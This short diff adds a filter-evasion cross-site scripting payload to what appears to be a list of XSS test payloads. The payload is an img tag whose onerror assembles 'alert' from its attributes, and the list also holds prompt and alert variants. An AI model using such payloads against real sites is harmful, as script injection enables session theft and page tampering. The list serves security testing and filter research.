@@ -99,6 +99,7 @@ content['alert'](6)
  
  
  //xsschop
+ <img  alt=al lang=ert  src=? onerror=top[alt%2blang]`0`>
  <img src=?  onerror=_=prompt,_`?` >
  <script>prompt`?`</script>
  <script>alert`/`</script>
